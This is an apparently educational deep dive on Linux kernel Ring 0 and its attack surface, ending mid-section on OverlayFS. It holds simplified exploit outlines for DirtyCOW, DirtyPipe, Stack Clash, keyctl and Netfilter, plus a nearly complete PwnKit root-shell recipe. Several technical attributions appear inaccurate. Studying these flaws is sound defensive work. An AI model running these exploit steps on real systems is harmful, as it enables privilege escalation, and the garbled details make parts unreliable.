# Ring 0 (Kernel) — Technical Deep Dive

> **Classification**: Privilege Ring 0 | **Mode**: Kernel Mode | **Privilege Level**: CPL 0 (highest)

---

## Table of Contents

1. [What is Ring 0?](#1-what-is-ring-0)
2. [What Runs in Ring 0](#2-what-runs-in-ring-0)
3. [Kernel Attack Surface (from Ring 3)](#3-kernel-attack-surface-from-ring-3)
4. [Major Kernel CVEs and Exploits](#4-major-kernel-cves-and-exploits)
5. [Kernel Exploitation Techniques](#5-kernel-exploitation-techniques)
6. [Kernel Hardening](#6-kernel-hardening)

---

## 1. What is Ring 0?

Ring 0 is the most privileged execution level in the x86/x86-64 protection ring architecture. Code executing at Ring 0 operates in what is commonly called **kernel mode** (or supervisor mode on ARM). The CPU enforces privilege levels via the Current Privilege Level (CPL) field in the code segment (CS) register — CPL=0 grants unrestricted access to all hardware and memory.

### Key Properties

| Property | Description |
|---|---|
| **Full Privilege** | All CPU instructions are executable — including privileged instructions like `CLI`, `HLT`, `IN/OUT`, `MOV CRx`, `WRMSR`, `INVLPG`. Any attempt to execute these from Ring 3 triggers a General Protection Fault (#GP). |
| **Kernel Mode** | The OS kernel, its data structures, and all kernel-mode code share this privilege level. There is no finer-grained privilege distinction within Ring 0 on x86 — all Ring 0 code is equally privileged. |
| **Direct Hardware Access** | Ring 0 code can directly read/write I/O ports (`in/out`), manipulate page tables (CR3), control interrupts (APIC, IDT), manage MSRs, and access all physical memory. |
| **Memory Access** | Ring 0 bypasses user-space page protections. Even when SMAP is enabled, `stac`/`clac` instructions allow controlled access to user pages. Without SMAP, Ring 0 can freely read/write any mapped user memory. |
| **Interrupt Control** | Ring 0 can mask interrupts (`cli`/`sti`), reprogram the IDT, and handle hardware interrupts directly. |

### Ring Model Diagram

```
 +-------------------------------------------+
 |  Ring 3  |  User Mode (applications)      |  Least Privilege
 |----------|---------------------------------|
 |  Ring 2  |  (Unused on modern OSes)         |
 |  Ring 1  |  (Unused on modern OSes)         |
 |----------|---------------------------------|
 |  Ring 0  |  Kernel Mode (OS kernel, drivers)|  Full Privilege
 +-------------------------------------------+
```

> **Note**: Linux and Windows use only Rings 0 and 3 in practice. Rundeck-style "Ring 1/2" are unpopulated. Some hypervisors use Ring 1 or VMX non-root mode for guest kernels, but from the guest kernel's perspective it still perceives itself at CPL 0.

### CPL Transitions: Ring 3 → Ring 0

The only legitimate ways to transition from Ring 3 to Ring 0 are:

1. **Syscall / Sysenter** — Fast system call instructions (MSR-configured entry points)
2. **Interrupt 0x80** — Legacy Linux system call gateway
3. **Hardware Interrupts** — CPU exceptions and IRQs that trigger IDT gates with DPL=0
4. **Call Gates** — Rarely used on modern OSes

Each transition saves the user-mode stack pointer and switches to a kernel stack (located in `task_struct->stack`).

```c
// Simplified syscall entry (x86-64 entry_SYSCALL_64)
// CPU executes:
//   1. RSP = MSR_IA32_KERNEL_ESP (per-CPU kernel stack)
//   2. CS = __KERNEL_CS  (CPL=0)
//   3. SS = __KERNEL_DS
//   4. RIP = MSR_IA32_LSTAR (entry point)
//   5. RFLAGS saved, IF cleared
```

---

## 2. What Runs in Ring 0

### 2.1 OS Kernel

The kernel itself is the primary Ring 0 entity. On Linux, this encompasses:

- **Process scheduler** (`kernel/sched/`) — CFS (Completely Fair Scheduler), realtime scheduling
- **Memory management** (`mm/`) — Page allocator, SLUB/SLAB allocators, page fault handler, OOM killer
- **Virtual filesystem** (`fs/`) — VFS layer, ext4/xfs/btrfs filesystem drivers
- **Network stack** (`net/`) — TCP/IP, netfilter, XDP, socket layer
- **IPC** (`ipc/`) — System V IPC, pipes, signals, POSIX message queues
- **Security subsystem** (`security/`) — LSM hooks, SELinux, AppArmor, Smack
- **Architecture code** (`arch/x86/`) — IDT, page tables, entry/exit paths, interrupt controllers

The kernel image (`vmlinux`) is mapped into every process's address space in the high half (e.g., `0xffff800000000000`–`0xfffffffffffffff` on x86-64 with KASLR disabled), sharing the same kernel text/pages across all processes via identical page table entries.

### 2.2 Kernel Modules / Device Drivers

Loadable Kernel Modules (LKMs) are dynamically loaded code that executes at Ring 0 with full privilege. This is one of the **largest and most bug-prone portions** of the kernel attack surface.

```c
// Minimal kernel module skeleton
#include <linux/module.h>
#include <linux/kernel.h>

static int __init mod_init(void) {
    printk(KERN_INFO "module loaded — now running in Ring 0\n");
    return 0;
}

static void __exit mod_exit(void) {
    printk(KERN_INFO "module unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);
MODULE_LICENSE("GPL");
```

Key driver categories executing in Ring 0:

| Category | Examples | Risk Profile |
|---|---|---|
| GPU drivers | AMDGPU, Nouveau, i915 | Large attack surface; complex MMU programming |
| Network drivers | e1000, r8169, bnx2x, virtio_net | Process untrusted packets from the wire |
| USB drivers | usb-storage, hid, xhci-hcd | Parse complex descriptor chains from devices |
| Filesystem drivers | ext4, ntfs3, vfat, f2fs | Parse on-disk metadata of potentially malicious images |
| Character/Block devices | /dev/mem, /dev/kmem (if enabled), loop, nbd | Direct kernel memory or block I/O |
| Virtualization | KVM, VFIO | Expose hardware virtualization primitives |
| Misc drivers | netfilter, tc, BPF verifier | Complex state machines and JIT compilation |

Modules inherit all kernel privileges. A single LKM vulnerability can compromise the entire system.

### 2.3 Interrupt Handlers / Bottom Halves

**Top Half (Interrupt Service Routines — ISRs):** Execute immediately at Ring 0 when hardware interrupts fire. They run with interrupts disabled (or partially masked) and must be fast.

**Bottom Halves:** Deferred work that can be interrupted:

- **Tasklets** — Run in interrupt context, serialized per CPU
- **Softirqs** — `NET_RX`, `NET_TX`, `TIMER`, `BLOCK` — high-priority deferred work
- **Workqueues** — Run in process context (can sleep); executied by kernel threads (`kworker`)

```c
// Interrupt context hierarchy
// 1. Hard IRQ (top half) — runs with interrupts disabled
//    └─ irq_handler()  // registered via request_irq()
//
// 2. SoftIRQ (bottom half) — runs with interrupts enabled
//    └─ net_rx_action()  // e.g., processes incoming packets
//
// 3. Workqueue — process context, can sleep
//    └─ worker_thread() → process_one_work() → work_func()
```

Both top and bottom halves execute at Ring 0, but differ in what kernel APIs they may call (no sleeping in hard IRQ context).

### 2.4 eBPF JIT Programs (Partial)

Extended BPF (eBPF) allows unprivileged (or CAP_BPF-capable) users to inject programs that are **verified** and then JIT-compiled to native code that executes in kernel context.

- **Verification** — The BPF verifier checks programs for safety: no unbounded loops, no out-of-bounds access, no kernel pointer leaks.
- **JIT Compilation** — Verified BPF programs are translated to native x86-64 and mapped into kernel memory as executable pages.
- **Execution Context** — BPF programs run at Ring 0 with limited privileges. They cannot call arbitrary kernel functions — only whitelisted BPF helpers.

Despite the verifier, eBPF is a significant attack surface. Bugs in the **verifier** (incorrect pruning of unreachable paths, type confusion, precision tracking errors) have repeatedly led to arbitrary Ring 0 code execution.

```c
// BPF program types and their contexts
BPF_PROG_TYPE_SOCKET_FILTER  // attached to sockets
BPF_PROG_TYPE_KPROBE         // attached to kernel tracepoints
BPF_PROG_TYPE_SCHED_CLS      // tc classifier
BPF_PROG_TYPE_XDP            // early network packet processing
BPF_PROG_TYPE_LSM            // Linux Security Module hooks
```

---

## 3. Kernel Attack Surface (from Ring 3)

The boundary between Ring 3 and Ring 0 defines the kernel attack surface. Every path where user-controlled data crosses this boundary is a potential vulnerability vector.

### 3.1 System Calls (syscalls)

The primary Ring 3 → Ring 0 interface. Linux exposes ~400+ syscalls. Each one involves:

1. User registers saved to kernel stack
2. Copy of arguments from user memory (via `copy_from_user()`)
3. Kernel-side processing
4. Return value copied back

**High-risk syscalls** (complex parsing, historical bugs):

| Syscall | Risk Vector | Notable Bugs |
|---|---|---|
| `write()` | VFS interaction, pipe buffer corruption | DirtyPipe (CVE-2022-0847) |
| `mmap()` | Address space manipulation, page fault paths | Stack Clash (CVE-2017-1000364) |
| `ptrace()` | Process introspection, register manipulation | CVE-2019-13272, CVE-2023-0386 |
| `bpf()` | BPF program load/verification | Multiple verifier escapes |
| `clone()` | Task creation, signal handling, COW | DirtyCOW (CVE-2016-5195) |
| `io_uring_setup()` | Async I/O, kernel state machines | Multiple 2020-2023 UAFs |
| `keyctl()` | Keyring management | CVE-2016-0728 |
| `add_key()` | Key type instantiation | CVE-2016-0728 |
| `perf_event_open()` | Performance counters, PMC access | CVE-2020-14333 |
| `sendmsg()` | Netlink, SCM_RIGHTS, socket filters | CVE-2022-0185 |
| `finit_module()` | Module loading (requires CAP_SYS_MODULE) | Various symbol/section bugs |

**Generic syscall vulnerability patterns:**

```c
// Pattern 1: Missing access_ok() check
// User passes kernel address → copy_from_user bypasses check
static long my_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct my_struct __user *uarg = (struct my_struct __user *)arg;
    struct my_struct karg;
    // BUG: no access_ok() check before copy_from_user
    if (copy_from_user(&karg, uarg, sizeof(karg)))
        return -EFAULT;
    // ... use karg ...
}

// Pattern 2: TOCTOU (Time-of-Check-Time-of-Use)
static long my_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct my_struct __user *uarg = (struct my_struct __user *)arg;
    if (uarg->size > MAX_SIZE)
        return -EINVAL;
    // User modifies uarg->size between check and use:
    kmalloc(uarg->size, GFP_KERNEL);  // May allocate smaller than actual copy
    copy_from_user(buf, uarg->data, uarg->size);  // Heap overflow
}

// Pattern 3: Integer overflow in size calculations
static long my_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    unsigned long count;
    // count from user can overflow: count * sizeof(struct item) wraps
    buf = kmalloc(count * sizeof(struct item), GFP_KERNEL);
    copy_from_user(buf, uarg->items, count * sizeof(struct item)); // overflow
}
```

### 3.2 /proc, /sys, /dev Entries

These virtual filesystems expose kernel data structures to userspace, creating a bidirectional attack surface:

**`/proc` entries:**
- `/proc/<pid>/mem` — Direct process memory read/write (requires `ptrace` attach checks)
- `/proc/<pid>/maps` — Information leak of ASLR layout
- `/proc/<pid>/cmdline`, `/proc/<pid>/environ` — Access to process data
- `/proc/kcore` — Kernel memory image (root only, but powerful)
- `/proc/sys/kernel/*` — Tunable kernel parameters
- `/proc/self/attr/*` — SELinux/AppArmor context manipulation

**`/sys` entries:**
- `/sys/kernel/mm/*` — Memory management parameters
- `/sys/module/*/parameters/*` — Module parameter writes
- `/sys/devices/system/cpu/cpu*/cpufreq/*` — CPU frequency governor control

**`/dev` entries:**
- `/dev/mem`, `/dev/kmem` — Direct physical/kernel memory access (often disabled)
- `/dev/port` — I/O port access (root only)
- `/dev/input/event*` — Input device event injection
- `/dev/dri/card*` — GPU device control (complex ioctl surface)
- `/dev/kvm` — KVM virtualization control
- `/dev/vhost-net` — Virtio networking

```c
// Example: /dev entry attack surface
static long gpu_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
    case GPU_IOCTL_SUBMIT_CMDS:
        // Parses complex command buffers from user
        return parse_and_submit_cmds(filp, arg);
    case GPU_IOCTL_SET_DOMAIN:
        // GPU MMU manipulation
        return set_gpu_domain(filp, arg);
    // ... dozens more ioctl commands, each a potential vuln
    }
}
```

### 3.3 ioctl Interfaces

`ioctl()` is the catch-all syscall for device-specific operations. Each driver defines its own ioctl commands with unique argument structures, making it one of the **most bug-dense** kernel interfaces.

```c
// ioctl command encoding (32-bit)
#define _IOC(dir, type, nr, size) \
    (((dir)  << _IOC_DIRSHIFT) | \
     ((type) << _IOC_TYPESHIFT) | \
     ((nr)   << _IOC_NRSHIFT) | \
     ((size) << _IOC_SIZESHIFT))

// Common ioctl vulnerabilities:
// 1. Missing size validation
// 2. Uninitialized struct fields copied to user (info leak)
// 3. Double fetch / TOCTOU
// 4. Use-after-free via race on mmap'd buffers
// 5. Arbitrary kernel address read/write via pointer arithmetic
```

### 3.4 Netlink Sockets

Netlink is a socket-based IPC mechanism between kernel and userspace. It is the primary configuration interface for networking, netfilter, SELinux, task stats, and more.

**Attack surface:**
- `NETLINK_ROUTE` — Network configuration (rtnetlink)
- `NETLINK_NETFILTER` — Firewall/NAT rules
- `NETLINK_SELINUX` — SELinux policy updates
- `NETLINK_AUDIT` — Audit subsystem
- `NETLINK_KOBJECT_UEVENT` — Kernel event notifications

```c
// Netlink message parsing bugs are common
// Example: CVE-2022-0185 (load_u32 in fs/proc/base.c via cgroup netlink)
// Integer overflow in 4-byte element count → heap overflow

// Pattern: Nested attribute parsing without depth limits
static int parse_nested_attr(const struct nlattr *head, int len) {
    const struct nlattr *attr;
    nla_for_each_attr(attr, head, len, rem) {
        if (nla_type(attr) == MY_NESTED)
            // BUG: no depth limit → stack overflow via recursive nesting
            return parse_nested_attr(nla_data(attr), nla_len(attr));
    }
}
```

### 3.5 BPF Programs

The `bpf()` syscall allows loading BPF programs into the kernel. The **verifier** is the gatekeeper preventing Ring 0 code execution from Ring 3.

**Verifier bypass patterns:**
1. **Precision tracking bugs** — Verifier incorrectly narrows or widens register ranges
2. **Dead code elimination flaws** — Paths marked as unreachable actually reachable at runtime
3. **Scalar-vs-pointer confusion** — Verifier treats kernel pointer as scalar (or vice versa)
4. **Bounds checking errors** — Incorrect arithmetic on bounds leads to OOB access
5. **ALU32 sign extension** — 32-bit ALU operations produce different results than verifier predicts

```c
// CVE-2020-8835: BPF verifier incorrect bounds tracking
// The verifier tracked:
//   r6 = 0  (known value 0)
//   if (r6 >= 0) goto  // always true, so "r6 >= 0" path is only one tracked
//   // verifier prunes this path, but at runtime:
//   // a crafted map value could make r6 != 0
// Leading to OOB read/write with r6 as index
```

### 3.6 File Systems (Parsing Untrusted Data)

Mounting a crafted filesystem image is a powerful attack vector. The kernel parses on-disk metadata (superblocks, inodes, directory entries, extended attributes) without trusting it — but bugs in parsing lead to memory corruption.

**High-risk filesystems:**

| Filesystem | Risk Rationale |
|---|---|
| ext4 | Complex journaling, extent trees, inline data |
| ntfs3 | Reverse-engineered format, new driver (Linux 5.15+) |
| f2fs | Log-structured, complex garbage collection |
| vfat | Legacy format,fat directory entry parsing |
| overlayfs | Layered mounts, permission handling (CVE-2023-0386) |
| procfs/sysfs | Dynamic content generation, race-prone |
| NFS/CIFS | Network filesystem — data arrives over the wire |

```c
// Typical filesystem parsing pattern
// (simplified from ext4_fill_super)
static int ext4_fill_super(struct super_block *sb, void *data, int silent) {
    struct ext4_super_block *es;

    // Read superblock from disk (READ IT AGAIN pattern)
    es = (struct ext4_super_block *)(bh->b_data);

    // Validate fields
    if (le32_to_cpu(es->s_inodes_count) == 0) {
        // ... reject
    }

    // BUG: what if es->s_desc_size is 0 or wraps?
    // → integer overflow in group descriptor sizing
    sbi->s_desc_per_group = desc_per_group;
    sbi->s_desc_size = le16_to_cpu(es->s_desc_size);
    // ... many more fields parsed without full validation
}
```

### 3.7 Network Stack

The kernel network stack processes packets arriving from untrusted networks. Attackers on the same LAN (or via malicious server responses) can feed crafted packets into the kernel without any syscall involvement.

**Attack vectors by layer:**

| Layer | Component | Entry Point |
|---|---|---|
| L2 | Ethernet, VLAN, ARP | NIC driver RX path |
| L3 | IPv4/IPv6, ICMP, IGMP | `ip_rcv()`, `ipv6_rcv()` |
| L4 | TCP, UDP, SCTP, DCCP | `tcp_v4_rcv()`, `udp_rcv()` |
| L4 | Netfilter/nftables | `nf_hook_slow()` |
| L7 | Socket filters, XDP | `bpf_prog_run()` |

**Notable network stack CVEs:**
- CVE-2016-8655 — `af_packet` UAF (Stack Clash adjacent)
- CVE-2019-18683 — `vboxvideo` race condition
- CVE-2021-22555 — Netfilter heap OOB write (leads to LPE)
- CVE-2022-4279 — Netfilter `nf_tables` use-after-free
- CVE-2023-2163 — BPF verifier incorrect bounds tracking

```c
// Simplified network packet attack path (no syscall needed)
// Attacker sends crafted TCP packet → NIC DMA → driver RX → ip_rcv() → tcp_v4_rcv()
//
// Vulnerable pattern in net/packet/af_packet.c (CVE-2016-8655):
static int packet_set_ring(struct sock *sk, ...)
{
    // Race between packet_set_ring() and packet_bind_spkt()
    // → Use-after-free on po->tx_ring.pg_vec
    // → Ring 0 code execution
}
```

---

## 4. Major Kernel CVEs and Exploits

### CVE Summary Table

| # | CVE | Year | Component | Type | Impact | CVSS |
|---|-----|------|-----------|------|--------|------|
| 1 | CVE-2016-5195 | 2016 | mm/cow.c | Race condition | Local Privilege Escalation (LPE) | 7.8 |
| 2 | CVE-2022-0847 | 2022 | pipe.c | Missing initialization | LPE | 7.8 |
| 3 | CVE-2017-1000364 | 2017 | mm/mmap.c | Stack clash/VDMA | LPE | 7.2 |
| 4 | CVE-2021-4034 | 2021 | pkexec (polkit) | SUID binary abuse | LPE | 7.8 |
| 5 | CVE-2019-13272 | 2019 | kernel/ptrace.c | Race condition | LPE | 7.8 |
| 6 | CVE-2016-0728 | 2016 | keyctl | UAF / refcount overflow | LPE | 7.2 |
| 7 | CVE-2019-18683 | 2019 | vboxvideo | Race condition | LPE | 7.0 |
| 8 | CVE-2020-8835 | 2020 | BPF verifier | Incorrect bounds | LPE | 7.8 |
| 9 | CVE-2021-22555 | 2021 | Netfilter | Heap OOB write | LPE | 7.8 |
| 10 | CVE-2019-13279 | 2019 | ptrace | UAF | LPE / DoS | 6.7 |
| 11 | CVE-2020-14314 | 2020 | ext4 | OOB read | Info leak | 5.5 |
| 12 | CVE-2024-1086 | 2024 | Netfilter nf_tables | UAF | LPE | 7.8 |
| 13 | CVE-2023-0386 | 2023 | overlayfs | Copy-up permission bypass | LPE | 7.8 |
| 14 | CVE-2022-0185 | 2022 | cgroup/proc | Integer overflow | LPE / Container Escape | 7.0 |
| 15 | CVE-2021-33909 | 2021 | seq_file | Heap overflow | LPE | 7.8 |
| 16 | CVE-2023-32233 | 2023 | Netfilter nf_tables | UAF | LPE | 7.8 |
| 17 | CVE-2022-4279 | 2022 | Netfilter | UAF | DoS / LPE | 7.5 |
| 18 | CVE-2020-25710 | 2020 | BPF verifier | OOB access | LPE | 7.1 |

---

### Detailed CVE Analysis

#### CVE-2016-5195 — DirtyCOW

**Component**: `mm/cow.c` (Copy-On-Write fault handler)
**Type**: Race condition (TOCTOU)
**Impact**: Local privilege escalation — write to any read-only file (including setuid binaries)

The kernel's COW mechanism had a race window between the page fault check and the actual COW resolution. A user thread could `mmap()` a read-only file, then race a `write()` to the same file through `/proc/self/mem` with `FOLL_FORCE` (which bypasses the read-only check for ptrace-style writes), while `madvise(MADV_DONTNEED)` discards the COW page, forcing the original page to be written to.

```c
// Simplified DirtyCOW race (pseudocode)
// Thread 1: write via /proc/self/mem (FOLL_FORCE bypasses write permission)
void *map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
int memfd = open("/proc/self/mem", O_RDWR);

// Thread 2: madvise to discard COW'd page
while (1) {
    madvise(map, PAGE_SIZE, MADV_DONTNEED);
}

// Thread 1: write to the read-only mapping via /proc/self/mem
while (1) {
    lseek(memfd, (off_t)map, SEEK_SET);
    write(memfd, payload, sizeof(payload));
}

// The race:
// 1. write() triggers COW → allocates new page (copy of original)
// 2. madvise(DONTNEED) discards the COW page
// 3. write() falls through to the ORIGINAL page (not the COW copy)
// 4. Original page is modified → persistent modification to the file
//
// Impact: Modify /usr/bin/sudo, /etc/passwd, or setuid binaries
```

**Patch**: `9192768a358e` — Added `FAULT_FLAG_ALLOW_RETRY` handling and proper COW locking to prevent the race.

#### CVE-2022-0847 — DirtyPipe

**Component**: `fs/pipe.c` (pipe buffer handling)
**Type**: Missing initialization
**Impact**: Local privilege escalation — overwrite any readable file's page cache content

The `pipe` struct's `pipe_buffer` array had `flags` field that was not zeroed on allocation. When `splice()` copied data into a pipe from a file, the `PIPE_BUF_FLAG_CAN_MERGE` flag from a previous pipe operation would persist, causing subsequent `write()` to the pipe to merge data directly into the file's page cache instead of creating a new page.

```c
// DirtyPipe exploitation (simplified)
// Step 1: Fill pipe with arbitrary data (all PIPE_BUF_FLAG_CAN_MERGE set)
int p[2];
pipe(p);
for (int i = 0; i < PIPE_CAPACITY; i++)
    write(p[1], "X", 1);

// Step 2: Drain pipe (flags remain set on pipe_buffer entries)
for (int i = 0; i < PIPE_CAPACITY; i++)
    read(p[0], &c, 1);

// Step 3: splice() one page from target file into pipe
//   → pipe_buffer[i].flags still has CAN_MERGE
//   → data is NOT from the file, but the page is the FILE's page cache page
splice(fd, &offset, p[1], NULL, PAGE_SIZE, 0);

// Step 4: write() to the pipe — merges into the file's page cache!
write(p[1], exploit_data, exploit_len);

// Result: exploit_data is written into the target file's page cache
// No actual file modification on disk (until writeback) but persisted in cache
// Overwrite /etc/passwd, /usr/bin/sudo, etc.
```

**Patch**: `9d2231c88d6e` — Clear `pipe_buffer.flags` in `copy_page_to_iter_pipe()`.

#### CVE-2017-1000364 — Stack Clash

**Component**: `mm/mmap.c` (Stack guard gap)
**Type**: Stack exhaustion / guard page bypass
**Impact**: Local privilege escalation — overwrite arbitrary memory adjacent to the stack

The Stack Clash attack exploits the fact that Linux's stack guard gap was only 4KB (one page). By allocating large amounts of memory via `mmap()` or heap growth, an attacker could move the heap pointer close to the stack. Then, by using `alloca()` or VLA to grow the stack, the stack pointer could jump over the guard page (since a single `alloca()` can grow the stack by more than 4KB in one step), landing in the heap where attacker-controlled data resides.

```c
// Stack Clash privilege escalation (simplified)
// Step 1: Consume address space to push heap close to stack
void *heap_ptr;
for (int i = 0; i < N; i++) {
    heap_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

// Step 2: Allocate a large stack frame that skips over the guard page
// The guard page is only 4KB — allocate 64KB+ to jump over it
void jump_guard_page() {
    char big_stack[65536]; // 64KB stack allocation
    // Stack pointer now points into heap area (past guard page)
    // Attacker can craft data at this heap location
    // If this is near a saved return address → EIP control
}

// Step 3: ROP payload in the heap region the stack collided with
// Function pointers, return addresses in the collided region → code exec
```

**Patch**: `a077e872c31e` — Increased the minimum stack guard gap to 256 pages (1MB) and made it configurable via `/proc/sys/vm/stack_guard_gap`.

#### CVE-2021-4034 — PwnKit (polkit pkexec)

**Component**: `polkit/pkexec` (SUID binary)
**Type**: Environment variable injection / SUID exploitation
**Impact**: Local privilege escalation — arbitrary code execution as root

`pkexec` is a SUID root binary that processes arguments via `argc/argv`. When called with no arguments, it tried to process `argv[1]` without checking `argc`, which in the SUID environment with attacker-controlled environment variables, led to `g_find_program_in_path()` being called with an attacker-controlled string. This allowed loading of arbitrary shared libraries via `GCONV_PATH` and `gconv` modules.

```c
// PwnKit exploitation pattern
// 1. Create a malicious shared library that executes on load
// cat > pwn.c << 'EOF'
// #include <stdio.h>
// #include <stdlib.h>
// __attribute__((constructor)) void pwn() {
//     setuid(0); setgid(0);
//     system("/bin/bash");
// }
// EOF
// gcc -shared -fPIC -o pwn.so pwn.c

// 2. Create gconv module directory
// mkdir -p GCONV_PATH=.
// cp pwn.so GCONV_PATH=./pwn.so

// 3. Create charmap file referencing the malicious module
// echo "module PAYLOAD// INTERNAL ../pwn 2" > GCONV_PATH=.

// 4. Execute pkexec with crafted environment
// env -i GCONV_PATH=. PATH=/bin pkexec ""
//
// Result: pkexec loads pwn.so → root shell
```

**Patch**: `c2b2960` — Pkexec was patched to properly validate `argc` and sanitize the environment.

#### CVE-2019-13272 — ptrace Race Condition

**Component**: `kernel/ptrace.c` + `kernel/cred.c`
**Type**: Race condition (TOCTOU)
**Impact**: Local privilege escalation — child process can gain root credentials

A race condition between `ptrace(PTRACE_TRACEME)` and `execve()` of a SUID binary allowed a traced process to modify SUID binary memory after credentials were set. The issue was that `PTRACE_TRACEME` allowed a parent to trace the child across `execve()`, and the child could race to modify memory after the SUID binary set its effective UID to root but before it completed execution.

```c
// PTRACE execve race (simplified)
// Child process:
ptrace(PTRACE_TRACEME, 0, NULL, NULL);
raise(SIGSTOP);  // Stop ourselves
execve("/usr/bin/sudo", ...);  // Execute SUID binary
// Parent process:
waitpid(child, &status, 0);
// Child stopped at execve entry
// Modify child's memory via ptrace while it's running as root
ptrace(PTRACE_CONT, child, NULL, NULL);
// Inject shellcode or modify .text of SUID binary in memory
```

**Patch**: `6a4188a8d0` — Added proper credential transition checks in `ptrace` attach paths and restricted `PTRACE_TRACEME` across cred transitions.

#### CVE-2016-0728 — keyctl Reference Count Overflow

**Component**: `security/keys/key.c`
**Type**: Reference count overflow → use-after-free
**Impact**: Local privilege escalation

The `join_session_keyring()` function incremented the keyring's reference count on each call but only decremented it when the keyring was replaced. By calling `keyctl(KEYCTL_JOIN_SESSION_KEYRING, key_serial)` in a loop (~2^32 times for a 32-bit refcount), the reference counter would overflow, wrapping to 0, causing a use-after-free when the keyring was freed while still in use.

```c
// keyctl refcount overflow (CVE-2016-0728)
// The keyring's reference count was 32-bit atomic_t
// Overflow from 0xFFFFFFFF → 0 → keyring freed while still referenced

// Step 1: Get a keyring serial
key_serial_t key = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "sess");

// Step 2: Overflow the refcount (2^32 iterations)
for (uint32_t i = 0; i < 0xFFFFFFFF; i++) {
    keyctl(KEYCTL_JOIN_SESSION_KEYRING, "sess");
    // Each call increments refcount by 1, but only decrements by 1 on replacement
}

// Step 3: Trigger free — refcount wraps to 0, keyring is freed
// Step 4: Reallocate the freed keyring object with controlled data
// Step 5: Access the stale keyring → use-after-free → code exec

// Alternatively, use KEYCTL_CHOWN to change keyring UID to root
// Combined with UAF → arbitrary kernel R/W
```

**Patch**: `b5784d4` — Changed key reference counts to `atomic_long_t` (64-bit), preventing overflow on 64-bit systems, and added overflow checks.

#### CVE-2021-22555 — Netfilter Heap OOB Write

**Component**: `net/netfilter/x_tables.c`
**Type**: Heap OOB write (via integer wrapping)
**Impact**: Local privilege escalation

The `xt_compat_match_from_user()` and `xt_compat_target_from_user()` functions miscalculated the size of iptables entries when converting from 32-bit compat format to 64-bit native format. The size difference (`sizeof(struct xt_entry_match)` on 32-bit vs 64-bit) caused a negative offset computation that when passed to `memset()` resulted in an out-of-bounds write on the heap.

```c
// Netfilter compat layer size calculation (simplified)
// 32-bit struct is smaller than 64-bit struct
// When zeroing padding bytes, the delta computation was wrong:
//
// int pad = XT_ALIGN(t->u.match_size) - t->u.match_size;
// memset(m->data + t->u.match_size, 0, pad);
//
// If t->u.match_size > XT_ALIGN(...) at 64-bit, then pad < 0
// but pad was unsigned int, so it wrapped to a very large value
// memset(ptr + match_size, 0, 0xFFFF...) → massive heap write

// Exploit strategy:
// 1. Create a compat iptables rule with carefully sized match/target
// 2. Trigger xt_compat_match_from_user() → OOB write
// 3. OOB write corrupts adjacent msg_msg object on heap
// 4. Use corrupted msg_msg to read/write arbitrary kernel memory
// 5. Overwrite modprobe_path or cred structure → root
```

**Patch**: `68287c0` — Fixed the size calculation in the compat translation layer.

#### CVE-2020-8835 — BPF Verifier Bounds Tracking

**Component**: `kernel/bpf/verifier.c`
**Type**: Incorrect bounds tracking
**Impact**: Local privilege escalation — OOB read/write in kernel memory

The BPF verifier tracked ranges of possible values for each register. CVE-2020-8835 was caused by the verifier incorrectly tracking the range of a register after a conditional branch was pruned. Specifically, when verifying a `bpf_probe_read()` call inside a loop, the verifier would mark a branch as "visited" and skip re-verifying it, even though the register's range had changed on a subsequent iteration.

```c
// BPF verifier bug pattern (CVE-2020-8835)
// Simplified pseudocode:
//
// r1 = bpf_map_lookup_elem(&map, &key);  // r1 = pointer to map value
// r2 = *(u32*)(r1 + 0);                  // r2 = map value's index field
// if (r2 > MAX) goto out;                 // verifier records: r2 <= MAX
// r3 = r2;                                // r3 = r2 (same range)
// ... (more instructions that change r2's tracked range)
// if (r1 != 0) goto loop;                // verifier marks loop as "seen"
//
// On second iteration:
// r2's ACTUAL value may differ from verifier's tracked value
// The verifier prunes the second visit, so r2's incorrect range persists
// → r2 is used as an array index → OOB access

// Exploit steps:
// 1. Craft BPF program with bounds tracking discrepancy
// 2. Load BPF program (bpf() syscall with BPF_PROG_LOAD)
// 3. Trigger OOB read to leak kernel addresses (defeat KASLR)
// 4. Trigger OOB write to overwrite cred/capability structure → root
```

**Patch**: `b01bb4e` — Added `backtracking` of register liveness in the verifier to properly handle state pruning.

#### CVE-2024-1086 — Netfilter nf_tables UAF

**Component**: `net/netfilter/nf_tables_api.c`
**Type**: Use-after-free (double-free via nft_verdict_init)
**Impact**: Local privilege escalation, container escape

The `nf_tables` verdict handling had a bug where `NFT_MSG_NEWRULE` could set a verdict that refers to a chain (`NFT_JUMP`), and concurrent `NFT_MSG_DELCHAIN` could free the chain while the rule still referenced it. The issue was a missing `nf_tables_chain_dependency()` check or an incorrect reference count management for verdict targets.

```c
// Netfilter nf_tables UAF exploitation pattern (CVE-2024-1086)
//
// Thread A: Create rule with NFT_JUMP verdict → chain C
// Thread B: Delete chain C → chain freed
// Thread A: Rule still references chain C → UAF when packet hits rule
//
// Exploit steps:
// 1. Create two base chains: chain_A (input hook), chain_B (for exploit)
// 2. Create a jump rule in chain_A → jump to chain_C
// 3. Chain_C is a regular chain with reference count
// 4. Trigger race: delete chain_C while packet is traversing chain_A
// 5. chain_C object freed → reallocate with controlled data (msg_msg, pipe_buffer, etc.)
// 6. When packet hits the UAF rule → corrupt RIP or arbitrary kernel R/W
// 7. Overwrite modprobe_path or cred → root
```

#### CVE-2023-0386 — OverlayFS Copy-Up Permission Bypass

**Component**: `fs/overlayfs/copy_up.c`
**Type**: Permission/credential bypass
**Impact**: Local privilege escalation

OverlayFS failed to properly apply SELinux and capability checks during the "copy up" operation when a file was modified in the upper layer. A setuid binary in the lower layer could be copied up without preserving the correct security context, and `setuid`/`setgid` bits were not properly stripped.

```c
// OverlayFS copy-up path (simplified)
static int ovl_copy_up_one(struct dentry *parent, struct dentry *dentry) {
    // BUG: The copy-up operation used the caller's credentials
    // instead of the file's original credentials for security checks.
    // When a setuid binary is copied up:
    // 1. Lower layer: /lower/bin/sudo (setuid root, SELinux: bin_t)
